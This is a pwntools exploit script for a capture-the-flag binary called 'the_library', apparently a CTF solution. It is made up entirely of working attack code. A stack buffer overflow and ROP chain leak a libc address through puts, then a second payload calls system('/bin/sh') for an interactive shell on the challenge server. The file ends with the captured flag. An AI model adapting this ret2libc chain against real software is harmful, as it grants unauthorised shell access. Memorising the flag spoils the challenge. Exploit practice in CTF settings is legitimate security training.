from pwn import *
context(os = 'linux', arch = 'amd64')
context.log_level = 'debug'
e = ELF('./the_library')

if args.LOCAL:
    p = process('./the_library', env={'LD_PRELOAD': './libc-2.31.so'})
    print(p.pid)
    pause()
else:
    p = remote('challenge.ctf.games', 30384)
libc = ELF('./libc-2.31.so')
pop_rdi_ret = 0x401493
offset = 0x220
payload1 = b'a'*(offset + 8) + p64(pop_rdi_ret) + p64(e.got['puts']) + p64(e.plt['puts']) + p64(e.sym['main'])
p.sendline(payload1)
p.recvuntil(b'Wrong :(\n')
puts_addr = u64(p.recvuntil(b'\x7f')[-6:]+b'\x00\x00')
libc_base = puts_addr - libc.sym['puts']
system_addr = libc_base + libc.sym['system']
binsh_addr = libc_base + next(libc.search(b'/bin/sh\x00'))
p.success('puts_addr: {}, libc_base: {}, sys: {}, binsh: {}'.format(hex(puts_addr), hex(libc_base), hex(system_addr), hex(binsh_addr)))
payload2 = b'a'*(offset + 8) + p64(pop_rdi_ret) + p64(binsh_addr) + p64(0x40101a) + p64(system_addr) # 加个ret就行了，可能是栈/地址对齐？
# payload2 = b'a'*(offset + 8) + p64(pop_rdi_ret) + p64(e.got['atoi']) + p64(e.plt['gets']) + p64(e.sym['main']) # full RELRO, 不能改got表
p.recvuntil(b'> ')
p.sendline(payload2)
p.interactive()

# flag{54b7742240a85bf62aa6fcf16c7e66a4}